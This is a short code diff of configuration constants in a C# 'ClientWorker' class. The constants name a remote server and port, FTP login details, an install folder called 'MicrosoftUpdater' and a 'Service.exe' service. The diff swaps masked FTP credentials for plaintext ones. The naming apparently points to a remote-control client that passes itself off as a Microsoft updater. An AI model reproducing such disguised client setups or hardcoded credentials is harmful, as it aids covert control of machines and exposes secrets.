@@ -8,8 +8,8 @@ namespace ClientWorker
 	{
 		public static string currentServer = "fokes1.asuscomm.com";
         public static int port = 7777;
-        public static string ftpUser = "**";
-		public static string ftpPass = "********";
+        public static string ftpUser = "ff";
+		public static string ftpPass = "WorkerFF";
 		public static int ftpPort = 21;
 		public static string floaderNewCopy = "\\MicrosoftUpdater\\";
 		public static string service = "Service.exe";
